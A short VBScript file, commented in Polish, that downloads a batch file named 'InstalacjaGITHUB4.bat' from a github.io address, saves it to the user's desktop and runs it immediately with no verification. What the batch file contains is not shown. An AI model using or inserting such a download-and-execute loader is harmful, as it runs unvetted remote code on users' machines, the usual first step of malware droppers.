' Ścieżka URL do pliku
Dim url
url = "https://abolojakub.github.io/website/InstalacjaGITHUB4.bat"

' Ścieżka do pulpitu bieżącego użytkownika
Dim desktopPath
desktopPath = CreateObject("WScript.Shell").SpecialFolders("Desktop") & "\InstalacjaGITHUB4.bat"

' Pobierz plik
Dim xmlHttp
Set xmlHttp = CreateObject("MSXML2.XMLHTTP.6.0")
xmlHttp.Open "GET", url, False
xmlHttp.Send

' Zapisz plik na pulpicie
If xmlHttp.Status = 200 Then
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binarny
    stream.Open
    stream.Write xmlHttp.responseBody
    stream.SaveToFile desktopPath, 2 ' Nadpisz, jeśli plik już istnieje
    stream.Close
    Set stream = Nothing
    WScript.Echo "Pobrano plik na pulpit: " & desktopPath
Else
    WScript.Echo "Błąd pobierania pliku. Status HTTP: " & xmlHttp.Status
    WScript.Quit
End If

Set xmlHttp = Nothing

' Sprawdź, czy plik istnieje, zanim spróbujesz go uruchomić
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(desktopPath) Then
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run Chr(34) & desktopPath & Chr(34), 1, False
    Set shell = Nothing
Else
    WScript.Echo "Nie znaleziono pliku: " & desktopPath
End If
Set fso = Nothing

